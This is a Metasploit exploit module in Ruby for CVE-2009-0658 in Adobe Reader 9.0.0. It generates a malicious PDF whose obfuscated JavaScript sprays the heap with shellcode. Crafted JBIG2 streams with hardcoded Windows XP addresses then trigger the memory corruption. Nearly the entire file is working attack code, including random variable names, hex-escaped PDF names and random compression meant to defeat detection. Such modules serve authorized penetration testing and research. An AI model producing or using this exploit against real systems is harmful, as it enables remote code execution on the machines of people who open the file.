###
## This file is part of the Metasploit Framework and may be subject to
## redistribution and commercial restrictions. Please see the Metasploit
## Framework web site for more information on licensing and terms of use.
## http://metasploit.com/projects/Framework/
###

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe JBIG2Decode Memory Corruption Exploit',
			'Description'    => %q{
					This module exploits a heap-based pointer corruption flaw in Adobe Reader 9.0.0 and earlier.
					This module relies upon javascript for the heap spray.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 
			[ 
					# Metasploit implementation
					'natron', 
					# bl4cksecurity blog explanation of vuln [see References]
					'xort & redsand',
					# obfuscation techniques and pdf template from util_printf
					'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', 
			], 
			'Version'        => '$Revision$',
			'References'     => 
				[
					[ 'CVE' , '2009-0658' ],
					[ 'blog', 'http://bl4cksecurity.blogspot.com/2009/03/adobe-acrobatreader-universal-exploit.html'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => ""
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Adobe Reader v9.0.0 (Windows XP SP3 English)', { 'Ret' => '' } ],	
				],
			'DisclosureDate' => 'Feb 2009',
			'DefaultTarget'  => 0))

		register_options([
			OptString.new('FILENAME', [ false, 'The file name.',  'msf.pdf']),
			OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
		], self.class)

		end

	def exploit 
		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		
		nops    = Rex::Text.to_unescape(make_nops(4))
		pointerPattern1	= Rex::Text.to_unescape("\x00\x00\x00\x00\x90\x8a\x01\x07")
		pointerPattern2	= Rex::Text.to_unescape("\x90\x8a\x01\x07\x00\x00\x00\x00")
		
		# Randomize some variables
		rand1	= rand_text_alpha(rand(50) + 1) 
		rand2	= rand_text_alpha(rand(50) + 1) 
		rand3	= rand_text_alpha(rand(50) + 1) 
		rand4	= rand_text_alpha(rand(50) + 1) 
		rand5	= rand_text_alpha(rand(50) + 1) 
		rand6	= rand_text_alpha(rand(50) + 1) 
		rand7	= rand_text_alpha(rand(50) + 1) 
		rand8	= rand_text_alpha(rand(50) + 1) 
		rand9	= rand_text_alpha(rand(50) + 1) 
		rand10	= rand_text_alpha(rand(50) + 1) 
		rand11	= rand_text_alpha(rand(50) + 1) 
		rand12	= rand_text_alpha(rand(50) + 1) 
		rand13	= rand_text_alpha(rand(50) + 1) 
		rand14	= rand_text_alpha(rand(50) + 1) 
		rand15	= rand_text_alpha(rand(50) + 1) 
		rand16	= rand_text_alpha(rand(50) + 1) 
		rand17	= rand_text_alpha(rand(50) + 1) 
		rand18	= rand_text_alpha(rand(50) + 1) 
		rand19	= rand_text_alpha(rand(50) + 1) 
		rand20	= rand_text_alpha(rand(50) + 1) 
		
		script = %Q|
		var #{rand1} = "";
		var #{rand2} = "";
		var #{rand3} = unescape("#{shellcode}");
		var #{rand4} ="";

		for (#{rand5}=128;#{rand5}>=0;--#{rand5}) #{rand4} += unescape("#{nops}");
		#{rand6} = #{rand4} + #{rand3};
		#{rand7} = unescape("#{nops}");
		#{rand8} = 20;
		#{rand9} = #{rand8}+#{rand6}.length
		while (#{rand7}.length<#{rand9}) #{rand7}+=#{rand7};
		#{rand10} = #{rand7}.substring(0, #{rand9});
		#{rand11} = #{rand7}.substring(0, #{rand7}.length-#{rand9});
		while(#{rand11}.length+#{rand9} < 0x43500) #{rand11} = #{rand11}+#{rand11}+#{rand10};
		#{rand12} = new Array();
		for (#{rand5}=0;#{rand5}<35;#{rand5}++) #{rand12}[#{rand5}] = #{rand11} + #{rand6};
		
		for (#{rand5}=64;#{rand5}>=0;--#{rand5}) #{rand2} += unescape("#{pointerPattern1}");
		#{rand13} = #{rand2}.length + 20
		while (#{rand2}.length < #{rand13}) #{rand2} += #{rand2};
		#{rand14} = #{rand2}.substring(0, #{rand13});
		#{rand15} = #{rand2}.substring(0, #{rand2}.length-#{rand13});
		while(#{rand15}.length+#{rand13} < 0x43500) #{rand15} = #{rand15}+#{rand15}+#{rand14};
		#{rand16} = new Array();
		for (#{rand5}=0;#{rand5}<35;#{rand5}++) #{rand16}[#{rand5}] = #{rand15} + #{rand2};
		
		for (#{rand5}=64;#{rand5}>=0;--#{rand5}) #{rand1}+= unescape("#{pointerPattern2}");
		#{rand17} = #{rand1}.length + 20
		while (#{rand1}.length < #{rand17}) #{rand1}+=#{rand1};
		#{rand18} = #{rand1}.substring(0, #{rand17});
		#{rand19} = #{rand1}.substring(0,#{rand1}.length-#{rand17});
		while(#{rand19}.length+#{rand17} < 0x43500) #{rand19} = #{rand19}+#{rand19}+#{rand18};
		#{rand20} = new Array();
		for (#{rand5}=0;#{rand5}<35;#{rand5}++) #{rand20}[#{rand5}] = #{rand19} +#{rand1};
					|
					
		eaxptr		=   "\x00\x20\x50\xff" 		# CALL DWORD PTR DS:[EAX+20]
		eaxp20ptr	=   "\x05\x73\x00\x20" 		# The address eaxptr will call : ~0x05837df8 : shellcode location
		modifier	= [ "\x00\x2f\xaa\x14" , 	# EAX 0x002faa14 will write to ~0x075fffff : heap spray pointer pattern #1
						"\x00\x54\xc3\xae" ] 	# EAX 0x0054c3ae will write to ~0x0a450000 : heap spray pointer pattern #2

		jbig2stream		= Array.new
		(0..1).each { |i|
			jbig2stream[i]	= eaxptr + "\x40\x00" + modifier[i] + eaxp20ptr
		}

		# Create the pdf
		pdf = make_pdf(script, jbig2stream)

		print_status("Creating '#{datastore['FILENAME']}' file...") 

		file_create(pdf)
	end

	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end
	
	def ioDef(id)
		"%d 0 obj" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		result = ""
		str.scan(/./u) do |c|
			if rand(3) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c[0]
			# Randomize the spaces and newlines	
			elsif c == " "
				result << " " * (rand(3) + 1)
				if rand(2) == 0
					result << "\x0d\x0a"
					result << " " * rand(2)
				end
			else
				result << c
			end
		end
		result
	end
	
	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end
	
	def make_pdf(js, jbig2)

		xref = []
		eol = "\x0d\x0a"
		endobj = "endobj" << eol
    
		# Randomize PDF version?
		pdf = "%%PDF-%d.%d" % [1 + rand(2), 1 + rand(5)] << eol
		pdf << "%" << RandomNonASCIIString(4) << eol
		xref << pdf.length
		pdf << nObfu(" ") << ioDef(1) << nObfu(" << /Type /Catalog /Outlines ") << ioRef(2) << nObfu(" /Pages ") << ioRef(3) << nObfu(" /OpenAction ") << ioRef(5) << " >> " << endobj
		xref << pdf.length
		pdf << nObfu(" ") << ioDef(2) << nObfu(" << /Type /Outlines /Count 0 >> ") << endobj
		xref << pdf.length
		pdf << nObfu(" ") << ioDef(3) << nObfu(" << /Type /Pages /Kids [ ") << ioRef(4) << nObfu(" ") << ioRef(7) << nObfu(" ] /Count 2 >> ") << endobj
		xref << pdf.length
		pdf << nObfu(" ") << ioDef(4) << nObfu(" << /Type /Page /Parent ") << ioRef(3) << nObfu(" /MediaBox [0 0 612 792 ] >> ") << endobj
		xref << pdf.length
		pdf << nObfu(" ") << ioDef(5) << nObfu(" << /Type /Action /S /JavaScript /JS ") + ioRef(6) + " >> " << endobj
		xref << pdf.length

		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js), rand(5)+4) # Add random 4-9 compression level
		pdf << nObfu(" ") << ioDef(6) << nObfu(" << /Length %s /Filter [ /FlateDecode /ASCIIHexDecode ] >>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj
		xref << pdf.length
				
		pdf << nObfu(" ") << ioDef(7) << nObfu(" << /Type /Page /Parent ") << ioRef(3) << " /Contents [ " << ioRef(8) << nObfu(" ") << ioRef(9) << " ] >> " << eol
		
		(0..1).each { |i|		
			xref << pdf.length
			compressed = Zlib::Deflate.deflate(jbig2[i].unpack('H*').to_s, rand(8)+1) # Convert to ASCII hex, then deflate using random 1-9 compression
			pdf << nObfu(" ") << ioDef(8 + i) << nObfu(" << /Length %s /Filter [ /FlateDecode /ASCIIHexDecode /JBIG2Decode ] >> " % compressed.length) << eol
			pdf << "stream" << eol
			pdf << compressed << eol
			pdf << "endstream" << eol
			pdf << endobj		
		}

		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end
		pdf << "trailer" << nObfu("<< /Size %d /Root " % (xref.length + 1)) << ioRef(1) << " >> " << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol
	end

end